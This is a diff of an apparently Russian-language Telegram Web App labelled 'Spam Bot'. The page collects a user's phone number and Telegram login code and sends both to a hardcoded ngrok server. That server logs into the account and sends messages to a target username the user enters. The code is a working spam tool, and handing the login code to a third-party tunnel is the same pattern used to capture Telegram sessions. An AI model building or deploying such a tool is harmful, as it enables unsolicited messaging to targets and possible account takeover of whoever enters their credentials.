@@ -3,67 +3,42 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Mega Spammer</title>
+    <title>Spam Bot</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        body { 
-            font-family: sans-serif; 
-            padding: 20px; 
-            background-color: var(--tg-theme-bg-color, #fff); 
-            color: var(--tg-theme-text-color, #000); 
-            display: flex; flex-direction: column; align-items: center;
-        }
+        body { font-family: sans-serif; padding: 20px; background-color: var(--tg-theme-bg-color, #fff); color: var(--tg-theme-text-color, #000); display: flex; flex-direction: column; align-items: center; }
         .container { width: 100%; max-width: 350px; }
-        input { 
-            width: 100%; padding: 12px; margin-bottom: 15px; 
-            border-radius: 10px; border: 1px solid #ccc; 
-            box-sizing: border-box; font-size: 16px;
-        }
-        button { 
-            width: 100%; padding: 15px; 
-            background-color: var(--tg-theme-button-color, #3390ec); 
-            color: #fff; border: none; border-radius: 10px; 
-            font-size: 16px; font-weight: bold; cursor: pointer; 
-        }
-        button:active { opacity: 0.8; }
+        input { width: 100%; padding: 12px; margin-bottom: 15px; border-radius: 10px; border: 1px solid #ccc; box-sizing: border-box; font-size: 16px; }
+        button { width: 100%; padding: 15px; background-color: var(--tg-theme-button-color, #3390ec); color: #fff; border: none; border-radius: 10px; font-size: 16px; font-weight: bold; cursor: pointer; }
         .hidden { display: none; }
-        #status { margin-top: 15px; text-align: center; font-size: 14px; }
-        .success { color: green; }
-        .error { color: red; }
+        #status { margin-top: 15px; text-align: center; font-weight: bold; }
+        .error { color: red; } .success { color: green; }
     </style>
 </head>
 <body>
     <h2>🚀 Бот-Рассыльщик</h2>
-    
     <div class="container">
         <div id="step1">
             <input type="tel" id="phone" placeholder="+79991234567">
             <button onclick="login()">Получить код</button>
         </div>
-
         <div id="step2" class="hidden">
             <input type="number" id="code" placeholder="Код подтверждения">
             <button onclick="sendCode()">Войти</button>
         </div>
-
         <div id="step3" class="hidden">
             <input type="text" id="target" placeholder="Ник друга (без @)">
             <input type="text" id="btnName" placeholder="Текст кнопки" oninput="updBtn()">
             <button id="mainBtn" onclick="fire()">Поприветствовать</button>
         </div>
-        
         <div id="status"></div>
     </div>
 
     <script>
-        // =================================================================
-        // ВАЖНО: Вставь сюда ссылку из окна Ngrok (Forwarding)
-        // Она начинается на https:// и заканчивается на .ngrok-free.app
-        // БЕЗ слэша "/" в конце!
-        
-        const SERVER_URL = "https://stiffish-queenie-un-xxxx-xxxx.ngrok-free.app";
-        
-        // =================================================================
+        // ============================================
+        // ТВОЯ РАБОЧАЯ ССЫЛКА NGROK (УЖЕ ВСТАВЛЕНА)
+        const SERVER_URL = "https://stiffish-queenie-unbuskined.ngrok-free.dev";
+        // ============================================
 
         const tg = window.Telegram.WebApp;
         tg.expand();
@@ -79,14 +54,18 @@
 
         async function req(path, body) {
             try {
+                // Добавляем заголовок ngrok-skip, чтобы не было ошибки браузера
                 const response = await fetch(SERVER_URL + path, {
                     method: 'POST',
-                    headers: {'Content-Type': 'application/json', 'ngrok-skip-browser-warning': 'true'},
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'ngrok-skip-browser-warning': 'true'
+                    },
                     body: JSON.stringify(body)
                 });
                 return await response.json();
             } catch (e) {
-                return {status: 'error', message: 'Ошибка связи! Проверь, запущен ли Python и Ngrok.'};
+                return {status: 'error', message: 'Ошибка сети. Проверь Python!'};
             }
         }
 
@@ -94,28 +73,27 @@
             myPhone = document.getElementById('phone').value.replace(/\s/g, '');
             localStorage.setItem("ph", myPhone);
             showStatus("Подключение...");
-            
             let res = await req('/login/start', {phone: myPhone});
             if(res.status === 'ok') {
                 document.getElementById('step1').classList.add('hidden');
                 if(res.step === 'authorized') {
                     document.getElementById('step3').classList.remove('hidden');
-                    showStatus("Вы уже вошли!");
+                    showStatus("Вы уже авторизованы!");
                 } else {
                     document.getElementById('step2').classList.remove('hidden');
-                    showStatus("Код отправлен в Telegram!");
+                    showStatus("Код отправлен!");
                 }
             } else showStatus(res.message, true);
         }
 
         async function sendCode() {
             let code = document.getElementById('code').value.trim();
-            showStatus("Проверка кода...");
+            showStatus("Проверка...");
             let res = await req('/login/complete', {phone: myPhone, code: code});
             if(res.status === 'ok') {
                 document.getElementById('step2').classList.add('hidden');
                 document.getElementById('step3').classList.remove('hidden');
-                showStatus("Успешный вход!");
+                showStatus("Успешно!");
             } else showStatus(res.message, true);
         }
 
@@ -126,7 +104,7 @@
 
         async function fire() {
             let target = document.getElementById('target').value.trim();
-            showStatus("Отправляем...");
+            showStatus("Отправка...");
             let res = await req('/greet', {phone: myPhone, target: target});
             if(res.status === 'ok') showStatus("Отправлено: " + res.sent);
             else showStatus(res.message, true);
